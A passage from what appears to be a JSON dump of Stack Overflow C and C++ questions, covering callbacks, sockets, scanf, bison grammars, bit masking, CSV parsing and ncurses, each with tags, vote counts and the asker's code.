<code>glTexImage2D</code> separately.</p>\n"},{"tags":["c","function","callback","c++-cli"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":13184568,"title":"Passing C++/CLI Class Method as C function pointer","body":"<p>I have a third-party C library that provides this header:</p>\n\n<pre><code>//CLibrary.h\n#include &lt;Windows.h&gt;\n#include &lt;process.h&gt;\ntypedef void (WINAPI *CLibEventCallback)(int event, void *data);\n__declspec(dllexport) bool CLibStart (CLibEventCallback callback, void *data);\n\n// CLibrary.c -- sample implementation\nstatic CLibEventCallback cb;\n\nvoid _cdecl DoWork (void *ptr)\n{\n    for (int i = 0; i &lt; 10; ++i)\n    {\n        cb (i*i, ptr);\n        Sleep (500);\n    }\n}\n\n__declspec(dllexport) bool CLibStart (CLibEventCallback callback, void *data)\n{\n    cb = callback; // save address for DoWork thread...\n    _beginthread (DoWork, 0, data);\n    return true;\n}\n</code></pre>\n\n<p>I need to create a C++/CLI class that can call <strong>CLibStart</strong> and provide a class method as the function pointer.  As suggested below, this needs to be done with GetFunctionPointerForDelegate.  Because the delete constructor includes 'this' and doesn't require a static method, I don't need to pass 'this' into CLibStart.</p>\n\n<pre><code>using namespace System;\nusing namespace System::Runtime::InteropServices;\n\nnamespace Sample {\n    public ref class ManagedClass\n    {   \n        delegate void CLibraryDelegate (int event, void *data);\n\n    private:\n        CLibraryDelegate^ managedDelegate;\n        IntPtr unmanagedDelegatePtr;\n        int someInstanceData;\n\n    public:\n        ManagedClass() \n        { \n            this-&gt;managedDelegate = gcnew CLibraryDelegate(this, &amp;ManagedClass::ManagedCallback);\n            this-&gt;unmanagedDelegatePtr = Marshal::GetFunctionPointerForDelegate(this-&gt;managedDelegate);\n            this-&gt;someInstanceData = 42;\n        }\n\n        void Start ()\n        {\n            // since the delegate includes an implicit 'this' (as static function is not needed)\n            // I no longer need to pass 'this' in the second parameter!\n            CLibStart ((CLibEventCallback) (void *) unmanagedDelegatePtr, nullptr); \n        }\n\n    private:\n        void Log (String^ msg)\n        {\n            Console::WriteLine (String::Format (\"someInstanceData: {0}, message: {1}\", this-&gt;someInstanceData, msg));  \n        }\n\n        void ManagedCallback (int eventType, void *data)\n        {\n            // no longer need \"data\" to contain 'this'\n            this-&gt;Log (String::Format (\"Received Event {0}\", eventType));\n        }\n    };\n}\n</code></pre>\n\n<p>All of this compiles and runs fine using this C# tester:</p>\n\n<pre><code>using System;\nusing Sample;\n\nnamespace Tester\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            var mc = new ManagedClass();\n            mc.Start();\n            Console.ReadKey();\n        }\n    }\n}\n</code></pre>\n\n<p>Sample output:</p>\n\n<pre><code>Received Event 0\nReceived Event 1\nReceived Event 4\nReceived Event 9\nReceived Event 16\nReceived Event 25\nReceived Event 36\nReceived Event 49\nReceived Event 64\nReceived Event 81\n</code></pre>\n\n<p><strong>Outstanding questions:</strong>  </p>\n\n<ol>\n<li>I have this feeling that I need to use gcroot and/or pin_ptr?  If\nso, how? where?</li>\n</ol>\n\n<p>Thanks.</p>\n"},{"tags":["c","browser"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":49,"score":-3,"question_id":13199615,"title":"C code to open web browser","body":"<p>What are some possible ways if any to execute a web browser on someone else's computer? I have a server and now when I use Process.Start. When someone executes that code from another computer the browser will show up on the server only.</p>\n\n<p>What are some ways to have the browser open in their computer instead?</p>\n"},{"tags":["c","variable-scope"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13199778,"title":"How is scope of variable implemented in compiler at machine level or memory level","body":"<p>How is scope of a variable is implemented by compilers?\nI mean, when we say static variable, the scope is limited to the block or funtions that defined in the same file where the static variable is defined?\nHow is this achieved in machine level or at memory level?</p>\n\n<p>How actually is this restriction achieved?</p>\n\n<p>How is this scoping resolved at program run time?</p>\n"},{"tags":["c++","c"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":168,"score":2,"question_id":13195353,"title":"How to find substring from string","body":"<p>How to find substring from the string path \"/user/desktop/abc/post/\" using c or c++. I want to check folder \"abc\" present or not in that path.</p>\n\n<p>Path is character pointer <code>char *ptr = \"/user/desktop/abc/post/\";</code></p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c","scanf"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13199213,"title":"scanf getting stuck","body":"<p>Im a beginner in C. Im using scanf function in my c program and its getting stuck and the program moves ahead only when i type exit.\nThe part of the code in which Im facing problem is:</p>\n\n<pre><code>while(fread(&amp;emr,recsize_emr,sizeof(emr)/recsize_emr,fp)==1)\n{\n    if(emr.emr_id==emr_id)\n    {\n        printf(\"%s %s %s %d %d %s %s %f \\n\\n\",emr.fname,emr.lname,emr.company_name,emr.emr_id,emr.agt_id,emr.pol_start_date,emr.pol_end_date,emr.amount);\n        printf(\"Enter New First Name, Last Name, Company Name, EmployerID, AgentID, Policy Start Date, Policy End Date, Amount : \");\n        scanf(\"%s %s %s %d %d %s %s %f \\n\",emr.fname,emr.lname,emr.company_name,&amp;emr.emr_id,&amp;emr.agt_id,emr.pol_start_date,emr.pol_end_date,&amp;emr.amount);\n        fseek(fp,-recsize_emr,SEEK_CUR);\n        fwrite(&amp;emr,recsize_emr,sizeof(emr)/recsize_emr,fp);\n        break;\n     }\n }\n</code></pre>\n"},{"tags":["c","time"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3514,"score":3,"question_id":5833094,"title":"Get a timestamp in C in microseconds?","body":"<p>How do I get a microseconds timestamp in C?</p>\n\n<p>I'm trying to do:</p>\n\n<pre><code>struct timeval tv;\ngettimeofday(&amp;tv,NULL);\nreturn tv.tv_usec;\n</code></pre>\n\n<p>But this returns some nonsense value that if I get two timestamps, the second one can be smaller or bigger than the first (second one should <strong>always</strong> be bigger). Would it be possible to convert the magic integer returned by <strong>gettimeofday</strong> to a normal number which can actually be worked with?</p>\n"},{"tags":["c","bison","yacc","lex","gnu-flex"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":42,"score":3,"question_id":13198231,"title":"Using character literals as terminals in bison","body":"<p>I'm trying to understand flex/bison, but the documentation is a bit difficult for me, and I've probably grossly misunderstood something.  Here's a test case: <a href=\"http://namakajiri.net/misc/bison_charlit_test/\" rel=\"nofollow\">http://namakajiri.net/misc/bison_charlit_test/</a></p>\n\n<p>File \"a\" contains the single character 'a'.  \"foo.y\" has a trivial grammar like this:</p>\n\n<pre><code>%%\n\nfile: 'a' ;\n</code></pre>\n\n<p>The generated parser can't parse file \"a\"; it gives a syntax error.</p>\n\n<p>The grammar \"bar.y\" is almost the same, only I changed the character literal for a named token:</p>\n\n<pre><code>%token TOK_A;\n\n%%\n\nfile: TOK_A;\n</code></pre>\n\n<p>and then in bar.lex:</p>\n\n<pre><code>a       { return TOK_A; }\n</code></pre>\n\n<p>This one works just fine.</p>\n\n<p>What am I doing wrong in trying to use character literals directly as bison terminals, like in the docs? </p>\n\n<p>I'd like my grammar to look like \"statement: selector '{' property ':' value ';' '}'\" and not \"statement: selector LBRACE property COLON value SEMIC RBRACE\"...</p>\n\n<p>I'm running bison 2.5 and flex 2.5.35 in debian wheezy.</p>\n"},{"tags":["c++","c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":77,"score":-4,"question_id":13199270,"title":"dereferencing array vs pointer","body":"<p>I'm sure this has been asked before, but a cursory google and stack overflow search didn't turn up the answer.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char a[128][1024];\n    strcpy(a[0], \"hello\");\n    strcpy(a[1], \"foo\");\n    strcpy(a[2], \"bar\");\n    char **b = a;\n    printf(\"%s\\n\", a[0]); //same as printf(\"%s\\n\", a)\n    printf(\"%s\\n\", a[2]+1); //print from 2nd char of 3rd string\n    printf(\"%s\\n\", b); //same as printf(\"%s\\n\", a), makes sense\n    printf(\"%s\\n\", b[0]); //segfault???\n}\n</code></pre>\n\n<p>First off, why is the last one a segfault? I'd expect same behavior as array <code>a</code>. How would I access the n-th string from b in a generalized way? What are the differences in treatment between a and b?</p>\n\n<p>On a similar note, the way I understand it, <code>a[n]</code> is syntactic sugar for <code>*(a+n)</code>. Is this correct, both for pointers and for arrays? Yet it seems getting different behavior for <code>a</code> and <code>b</code>.</p>\n\n<p>Thanks!</p>\n"},{"tags":["c","performance","bash","shell"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":1,"view_count":164,"score":6,"question_id":13088807,"title":"Shell script vs C performance","body":"<p>I was wondering how bad would be the impact in the performance of a program migrated to shell script from C. </p>\n\n<p>I have intensive I/O operations.</p>\n\n<p>For example, in C, I have a loop reading from a filesystem file and writing into another one. I'm taking parts of each line without any consistent relation. I'm doing this using pointers. A really simple program.</p>\n\n<p>In the Shell script, to move through a line, I'm using <code>${var:(char):(num_bytes)}</code>. After I finish processing each line I just concatenate it to another file.</p>\n\n<pre><code>\"$out\" &gt;&gt; \"$filename\"\n</code></pre>\n\n<p>The program does something like:</p>\n\n<pre><code>while read line; do\n    out=\"$out${line:10:16}.${line:45:2}\"\n    out=\"$out${line:106:61}\"\n    out=\"$out${line:189:3}\"\n    out=\"$out${line:215:15}\"\n    ...\n    echo \"$out\" &gt;&gt; \"outFileName\"\n\ndone &lt; \"$fileName\"\n</code></pre>\n\n<p>The problem is, C takes like half a minute to process a 400MB file and the shell script takes 15 minutes.</p>\n\n<p>I don't know if I'm doing something wrong or not using the right operator in the shell script.</p>\n\n<p>Edit: I cannot  use awk since there is not a pattern to process the line</p>\n\n<p>I tried commenting the \"echo $out\" >> \"$outFileName\" but it doesn't gets much better. I think the problem is the ${line:106:61} operation. Any suggestions? </p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["c","linux","http","sockets","file-download"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":13082418,"title":"Can anybody suggest me,How to implement pause and resume functionality to this Data Receiving Code?","body":"<p>This is Data Receiving functionality Code from http server, Perfectly Working.. But i want to add pause and Resume to this function..\ncan anybody suggest me how to do that ??<br>\nNote: Ignore variable Declaration.</p>\n\n<pre><code>int rest=0,size=0,count=0;                               \nmemset(buffer,'\\0',sizeof(buffer));\ndo {\n    rc=read(sockfd,buffer,1500);                  //Reading from socket connection\n    if(rest==0)\n    {   /*Extracting Content length*/\n        data=strstr((char*)buffer,\"Content-Length\"); \n        if(data!=NULL)\n        {\n            value=atoi((char*)data+15);data_rest=value;\n            rest=1;\n        }\n    }\n    if(count==0)\n    {   /*Extracting Header*/\n        content=strstr(buffer,\"\\r\\n\\r\\n\");\n        if(content!=NULL)\n        { \n            printf(\"FOUND Header END\\n\");\n            content=content+4;count=1;\n            /*copying DATA to the file which has same Extension*/\n            data_wrote=fwrite(content,sizeof(char),rc-(content-buffer),fp);\n        }\n    }\n    else\n    {\n        content=buffer;\n        /*copying DATA to the file which has same Extension*/\n        data_wrote=fwrite(content,sizeof(char),rc,fp);\n    }\n    size=size+rc;\n    total_wrote=total_wrote+data_wrote;\n    printf(\"Total size = %d\\n\",size);\n\n    memset(buffer,'\\0',sizeof(buffer));\n} while(rc&gt;0);  /*until end of file*/\n</code></pre>\n"},{"tags":["c","sockets"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":13194188,"title":"Too many open files when I run a infinite socket open and close","body":"<p>I have searched all about this question at this website.</p>\n\n<p>my program scenario is: </p>\n\n<ul>\n<li>there is one server that always listens for a request from  a client.</li>\n<li>there is one client that always requests a <code>char</code> from the server in 2 second periods</li>\n</ul>\n\n<p>get the error message:</p>\n\n<blockquote>\n  <p>Too many open files\" happened on socket() function after the program run about 1024 times.</p>\n</blockquote>\n\n<p>My current solution is to increase the number of open files: \n<code>\"ulimit -n 5000\"</code>, but I don't think this is a perfect solution, because it will make the program run 5000 times.</p>\n\n<p>So, does anybody have a better solution?</p>\n\n<p>Environment:</p>\n\n<ul>\n<li>ubuntu 10</li>\n<li>c language</li>\n</ul>\n\n<p>My code as following:</p>\n\n<p>Client:</p>\n\n<pre><code>    int sockfd;\n    struct sockaddr_in address;\nint socket_port = 9734;\n\nwhile (1) {\n\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    if (sockfd &lt; 0)\n        DieWithSystemMessage(\"socket() failed\");//&lt;&lt;===========Too many open files\n    memset(&amp;address, 0, sizeof(address));\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    address.sin_port = socket_port;\n    //Establish the connection to the server\n    if ((connect(sockfd, (struct sockaddr *) &amp;address, sizeof(address)))\n            &lt; 0)\n        DieWithSystemMessage(\"connect() failed\");\n\n    if (rename_count % 2 == 0)\n        ch = 'A';\n    else if (rename_count % 2 == 1)\n        ch = 'B';\n    else\n        ch = 'E';\n    ssize_t numBytes = send(sockfd, &amp;ch, strlen(&amp;ch), 0);\n\n    if (numBytes &lt; 0)\n        DieWithSystemMessage(\"send() failed\");\n    else if (numBytes != strlen(&amp;ch))\n        DieWithUserMessage(\"send()\", \"sent unexpected number of bytes\");\n    //fflush(sockfd);\n    shutdown(sockfd, SHUT_RDWR);\n\n    rename_count++;\n\n}\n</code></pre>\n\n<p>Server:</p>\n\n<pre><code>int server_sockfd, client_sockfd;\nint server_len, client_len;\nsocklen_t clntAddrLen;\nstruct sockaddr_in server_address;\nstruct sockaddr_in client_address;\nuint64_t start_time_micro, end_time_micro;\nint socket_num = 9734;\n\nserver_sockfd = socket(AF_INET, SOCK_STREAM, 0);\nif (server_sockfd &lt; 0)\n    DieWithSystemMessage(\"socket() failed\");\n\nmemset(&amp;server_address, 0, sizeof(server_address));\nserver_address.sin_family = AF_INET;\nserver_address.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\nserver_address.sin_port = socket_num;\n\nif ((bind(server_sockfd, (struct sockaddr *) &amp;server_address,\n        sizeof(server_address))) &lt; 0)\n    DieWithSystemMessage(\"bind() failed\");\nif ((listen(server_sockfd, 5)) &lt; 0)\n    DieWithSystemMessage(\"listen() failed\");\n\n\nwhile (1) {\n    char ch;\n    printf(\"\\nserver waiting\\n\");\n\n    //accept a connect\n    clntAddrLen = sizeof(client_address);\n    client_sockfd = accept(server_sockfd,\n            (struct sockaddr *) &amp;client_address, &amp;clntAddrLen);\n    if (client_sockfd &lt; 0)\n        DieWithSystemMessage(\"accept() failed\");\n    //reading and writing through client side\n    ssize_t numBytesRcvd = recv(client_sockfd, &amp;ch, 1, 0);\n    if (numBytesRcvd &lt; 0)\n        DieWithSystemMessage(\"recv() failed\");\n\n    if (ch == 'A') {\n        rename_num = 0;//printf(\"A\\n\");\n    } else if (ch == 'B') {\n        rename_num = 1;//printf(\"B\\n\");\n    } else\n        ;\n\n    printf(\"%d. Got it!!!\\n\", i);\n\n    close(client_sockfd);\n}\nclose(server_sockfd);\n</code></pre>\n"},{"tags":["c","audio","portaudio"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13172478,"title":"Wait until playback has completed","body":"<p>I'm using PortAudio as a front-end to a speech synthesis (Text to Speech) engine, and I want to provide a synchronous speak function that waits until playback has completed.</p>\n\n<p>It seems like all of the PortAudio functions that deal with this only wait until the underlying API has finished consuming the audio data, not until playback has finished.</p>\n\n<p>Is this possible with PortAudio? If not, are there any good cross-platform alternatives to PortAudio (has to include a C interface) that might support this?</p>\n"},{"tags":["c","compiler","volatile","sequence-points"],"answer_count":4,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":82,"score":5,"question_id":13197214,"title":"A compiler may not move accesses to volatile variables across sequence points; what does it mean?","body":"<p>Declaring a variable as 'volatile' means to read/write directly from the memory location, not from the register variable. I have a knowledge about 'sequence point'. But i dont understand  the statement mentioned in the title. </p>\n\n<p>Could someone explain the same, and give some code snippet also?</p>\n"},{"tags":["c","http"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":4235861,"title":"How would I get a string representation of a web page's source from URL in C?","body":"<p>How would I get a string representation of a web page's source from URL in C?</p>\n"},{"tags":["c++","c","streaming","ffmpeg","live"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1681,"score":4,"question_id":2534789,"title":"Using FFMPEG and url_fopen example","body":"<p>I wonder how to get a stream from a URL (with <a href=\"http://cekirdek.uludag.org.tr/~ismail/ffmpeg-docs/group__old__url__f__funcs.html#g6db7660f3f798193d0d72447894f9932\" rel=\"nofollow\"><code>url_fopen</code></a> for example) (live video or PCM stream for example) and encode it into something?</p>\n\n<p><em><strong>Update:</em></strong>\nThis actually was a mall formated question. It was about how to stream something out using url_fopen.</p>\n\n<p><em><strong>Answer:</em></strong>\nIt is quite simple:\nThere is like <a href=\"http://wiki.aasimon.org/doku.php?id=ffmpeg%3aurl_fopen\" rel=\"nofollow\">a short article explaining how to use it</a>\nAnd I had a small video streaming solution which actually used it and <a href=\"http://cekirdek.uludag.org.tr/~ismail/ffmpeg-docs/avio_8c.html#57f591eaf6c86d82cbe362b9cfd81225\" rel=\"nofollow\"><code>url_write</code></a> called <a href=\"http://code.google.com/p/cloudobserver/source/detail?r=678#\" rel=\"nofollow\">HelloVideoStreaming (windows sln)</a> some many revisions ago.</p>\n\n<p>Good thing is that you actually do not really need or want to use ffmpeg for streaming. But you want to have sendable packets of encoded data in order to send. <a href=\"http://code.google.com/p/cloudobserver/source/browse/?r=1122#svn/trunk/CloudClient\" rel=\"nofollow\">We have a client that does it (crossplatform, with premake project generation script)</a>. Main thing there is to use   <a href=\"http://cekirdek.uludag.org.tr/~ismail/ffmpeg-docs/avio_8h.html#53d2aad92a48effe20665b597a5e4dff\" rel=\"nofollow\"><code>url_open_dyn_buf</code></a> and <a href=\"http://cekirdek.uludag.org.tr/~ismail/ffmpeg-docs/avio_8h.html#34f67789f551d0f42c4394309529be91\" rel=\"nofollow\"><code>url_close_dyn_buf</code></a> which are shortly described <a href=\"http://lab.dyne.org/Ffmpeg/UseUrlProtocol\" rel=\"nofollow\">here</a></p>\n"},{"tags":["c++","c","utf-8","strncpy"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":518,"score":2,"question_id":7344683,"title":"utf8 aware strncpy","body":"<p>I find it hard to believe I'm the first person to run into this problem but searched for quite some time and didn't find a solution to this.</p>\n\n<p>I'd like to use strncpy but have it be UTF8 aware so it doesn't partially write a utf8 character into the destination string.</p>\n\n<p>Otherwise you can never be sure that the resulting string is valid UTF8, even if you know the source is (when the source string is larger than the max length).</p>\n\n<p>Validating the resulting string can work but if this is to be called a lot it would be better to have a strncpy function that checks for it.</p>\n\n<p>glib has g_utf8_strncpy but this copies a certain number of unicode chars, whereas Im looking for a copy function that limits by the byte length.</p>\n"},{"tags":["c","string","string-length"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13197422,"title":"Length of a string as string","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/9655202/how-to-convert-integer-to-string-in-c\">How to convert integer to string in C?</a>  </p>\n</blockquote>\n\n\n\n<p>I would like to calculate the length of the string and pass the value to a function as a string.</p>\n\n<pre><code>char* s=\"abcd\";\nint i = strlen(s);\nchar* lengthAsString = ????(i);\n</code></pre>\n"},{"tags":["c","function","prototype"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":59,"score":-2,"question_id":13194850,"title":"Using functions and prototypes in C","body":"<p>I'm new to C and I just don't know what I'm doing wrong. I can't get any functions to work and I think I've done the prototype correctly.</p>\n\n<pre><code>// Prototypes\nvoid foo(void);\n\nint main(){\n    stuff;\n    foo();\n}\n\nvoid foo(){ \n    otherStuff;\n}\n</code></pre>\n\n<p>So in this case <code>foo();</code> in <code>main()</code> does nothing. If I just put <code>otherStuff</code> right into <code>main()</code> then it works as it should. This means that there is something wrong with how I'm implementing functions but I can't find the answer. Thanks!</p>\n\n<p>EDIT: Adding real code, updated with suggestions.</p>\n\n<pre><code>#include...\n#define...\n\n// Prototypes\nvoid delay(void);\n\nint main(){\n    int pos = 0;\n    textInit();\n    // SNIP\n\n    while(1){\n        if (FIO0PIN &amp; UP || FIO0PIN &amp; DOWN){\n            if((FIO0PIN &amp; UP) == 0){\n                //SNIP\n            } else if((FIO0PIN &amp; DOWN) == 0){\n                //SNIP\n            } else if((FIO0PIN &amp; CENTRE) == 0){\n                //SNIP\n            }\n            delay();\n        }\n    }\n    return 0;\n}\n\nvoid delay(void){ \n    int j = 0;\n    for ( j = 0; j &lt; 5000000; j++ ) {}\n}\n</code></pre>\n\n<p>Before you chastise me for using a software delay let me just say that it's necessary at this point. If I put the delay code right into the main() then it works.</p>\n"},{"tags":["c++","c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":13197064,"title":"How to find substring from the string","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13195353/how-to-find-substring-from-string\">How to find substring from string</a>  </p>\n</blockquote>\n\n\n\n<p>How to find substring from the string path \"/user/desktop/abc/post/\" using c or c++. I want to check folder \"abc\" present or not in that path.</p>\n\n<p>Path is character pointer <code>char *ptr = \"/user/desktop/abc/post/\"</code> and <code>char *ptr = \"/user/desktop/abc\"</code>. could you please give me the hint to find <code>\"abc\"</code> in single program in both case.</p>\n\n<p>Thanks,</p>\n"},{"tags":["c"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":84,"score":0,"question_id":13192202,"title":"Why The Value Of K is Not Increasing in this code?","body":"<p><code>#include&lt;stdio.h&gt;</code></p>\n\n<pre><code>int main()\n\n{\nint i=-3, j=2, k=0, m;\nm = ++i &amp;&amp; ++j || ++k;\nprintf(\"%d, %d, %d, %d\\n\", i, j, k, m);\nreturn 0;\n}\n</code></pre>\n\n<p>The value of k increases if i am using a || operator but in case of &amp;&amp; the value is not increasing what would be the reason  for that , i am very confused.</p>\n\n<p>The out put is -2,3,0,1</p>\n"},{"tags":["c","bit-manipulation"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":72,"score":4,"question_id":13196387,"title":"How to change a 32bit registers specific bits without changing other bits?","body":"<p>I want to manipulate some bits of a register directly using its physical address. However I couldn't find a way to make this. I saw some posts about setting bit masks but I find them too confusing.</p>\n\n<p>My registers physical address is: <code>0x4A10005C</code></p>\n\n<p>I want to manipulate its bit which was between 18-16 bits. I want to set <code>0x3</code> inside those bits.</p>\n\n<p>I will be really glad if you guys can provide an answer or a way to do it. Thanks.</p>\n"},{"tags":["c","unix","select","client-server","send"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1084,"score":1,"question_id":2659752,"title":"C socket programming: client send() but server select() doesn't see it","body":"<p>I have a server and a client running on two different machines where the client <code>send()</code>s but the server doesn't seem to receive the message. The server employs <code>select()</code> to monitor sockets for any incoming connections/messages. I can see that when the server accepts a new connection, it updates the <code>fd_set</code> array but always returns 0 despite the client <code>send()</code> messages. The connection is TCP and the machines are separated by like one router so dropping packets are highly unlikely.</p>\n\n<p>I have a feeling that it's not <code>select()</code> but perhaps <code>send()</code>/<code>sendto()</code> from client that may be the problem but I'm not sure how to go about localizing the problem area.</p>\n\n<pre><code>    while(1)\n{\n    readset = info-&gt;read_set;   \n    ready = select(info-&gt;max_fd+1, &amp;readset, NULL, NULL, &amp;timeout);\n</code></pre>\n\n<p>}</p>\n\n<p>above is the server side code where the server has a thread that runs <code>select()</code> indefinitely.</p>\n\n<pre><code>rv = connect(sockfd, (struct sockaddr *) &amp;server_address, sizeof(server_address));\nprintf(\"rv = %i\\n\", rv);\nif (rv &lt; 0)\n{\n    printf(\"MAIN: ERROR connect() %i:  %s\\n\", errno, strerror(errno));\n    exit(1);\n}\nelse\n    printf(\"connected\\n\");\n\nsleep(3);\n\nchar * somemsg = \"is this working yet?\\0\";\nrv = send(sockfd, somemsg, sizeof(somemsg), NULL);\nif (rv &lt; 0)\n    printf(\"MAIN: ERROR send() %i:  %s\\n\", errno, strerror(errno));\nprintf(\"MAIN: rv is %i\\n\", rv);\nrv = sendto(sockfd, somemsg, sizeof(somemsg), NULL, &amp;server_address, sizeof(server_address));\nif (rv &lt; 0)\n    printf(\"MAIN: ERROR sendto() %i:  %s\\n\", errno, strerror(errno));\nprintf(\"MAIN: rv is %i\\n\", rv);\n</code></pre>\n\n<p>and this is the client side where it connects and sends messages and returns</p>\n\n<pre><code>connected\nMAIN: rv is 4\nMAIN: rv is 4\n</code></pre>\n"},{"tags":["objective-c","c","double","int","round"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":2003,"score":3,"question_id":5976141,"title":"Rounding up double numbers in Objective-C","body":"<p>I need C code for rounding up a double value to the next greatest integer value. </p>\n\n<p>For example, if I have:</p>\n\n<p><code>1.0 (double)</code> it must be <code>1 (int)</code><br>\n<code>1.01 (double)</code> it must be <code>2 (int)</code><br>\n<code>5.67 (double)</code> it must be <code>6 (int)</code><br>\n<code>76.43 (double)</code> it must be <code>77 (int)</code>  </p>\n\n<p>Is there a solution?</p>\n"},{"tags":["c","eclipse","dir","dirent.h"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":13196728,"title":"Code has errors, but compiles and running (DIR type)","body":"<p>Using eclipse CDT for C programs, on Linux Mint on VirtualBox (host is Windows FWIW).\nI'm trying to list all the files in a folder.</p>\n\n<p>According to eclipse, my code contains an error:\n\"Type 'DIR' could not be resolved\".\nBUT- when I compile it using GCC I get no errors, the code works fine and shows my files.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;dirent.h&gt;\n\nint main()\n{\nDIR *dir;\n/* rest of the code goes here */\nreturn 1;\n}\n</code></pre>\n\n<p>Eclipse shows the error \"Type 'DIR' could not be resolved\".</p>\n\n<p>I have another file on my computer, with the same code, but the error is NOT shown there.</p>\n\n<p>Any solution? I will provide any further data needed.\nThanks!</p>\n\n<hr>\n\n<p>Edit: I used to had a \"#define DIR 10\" when trying I first wrote the bits of code, and I thought that was the problem. So I removed the define. (Just after I chekced it is not the problem I wrote here). Is it possible the eclipse remembers that define?</p>\n"},{"tags":["c","file","csv","file-handling"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13193229,"title":"CSV file reading issue: with large amont of data","body":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar* getfield(char* line, int num) {\n    char* tok = line;\n    char* result;\n    if (line)\n    {\n        do\n        {\n            if (!--num)\n            {\n                tok = strchr(line, ',');\n                if (tok == NULL)\n                {\n                    tok = &amp;line[strlen(line)];\n                }\n                size_t fieldlen = tok - line;\n                if (fieldlen)\n                {\n                    result = (char*)malloc(fieldlen+1);\n                    result[fieldlen] = '\\0';\n                    strncpy(result, line, fieldlen);\n                    return result;\n                }\n                else\n                {\n                    break;\n                }\n            }\n            tok = strchr(line, ',');\n            line = tok + 1;\n        } while (tok);\n    }\n    result = (char*)malloc(2);\n    strcpy(result, \"0\");\n    return result;\n}\n\nint main()\n{\n    FILE* stream = fopen(\"data.csv\", \"r\");\n    char line[1024];\n    char *pstr;int num1,num2,num3;\n    char* value1,value2,value3;\n\n    while (fgets(line, 1024, stream))\n    {\n        char* tmp = strdup(line);\n\n        value1=getfield(tmp, 1);\n        value2=getfield(tmp, 2);\n        value3=getfield(tmp, 3);\n\n        num1 =strtol(value1,&amp;pstr,10);\n        num2 =strtol(value2,&amp;pstr,10);\n        num3 =strtol(value3,&amp;pstr,10)\n        free(value1); \n        free(value2); \n        free(value3);\n        printf(\"Fields 1,2,3 would be 1=%d 2=%d 3=%d\\n\", num1,num2,num3);\n        // NOTE strtok clobbers tmp\n        free(tmp);\n    }\n}\n</code></pre>\n\n<p>above is my C code to read the file....</p>\n\n<pre><code> :::: data.csv ::::\n    10,34,30\n    10,33,\n    23,45,23\n    25,,45\n</code></pre>\n\n<p>above is my file..</p>\n\n<p>here my issue is I can call the function with \"num\" field. so that for reading of every line I suppose to call the function 3 times.. !! so the performance is too low for the large data files.. can someone help me that  I can call the  function at once and It will return  an array.. than I can easily store and print (e.g. for the first line  array[0]=10,array[1]=34,array[2]=30 )</p>\n"},{"tags":["c","linux","eclipse","gcc","ncurses"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13195203,"title":"ncurses basic example - in debug i get: \"Error opening terminal: unknown.\"","body":"<p>doing some basic examples on ncurses libreries, I get some issues.</p>\n\n<p>Actually, I don't get what I expect (message printed), and going in debug, from eclipse, I get (in console area) \"Error opening terminal: unknown.\"</p>\n\n<p>Follows code:</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ncurses.h&gt;\n\n\nint main() {\n\n    initscr();\n\n    move(5,15);\n    printw(\"%s\", \"Hello world!\");\n    refresh();\n\n    endwin();\n    exit(EXIT_SUCCESS);\n}\n</code></pre>\n\n<p>Compiler options, as provided in Eclipse console at \"Build project\" command:</p>\n\n<pre><code>make all \nBuilding file: ../source/Curses_01.c\nInvoking: GCC C Compiler\ngcc 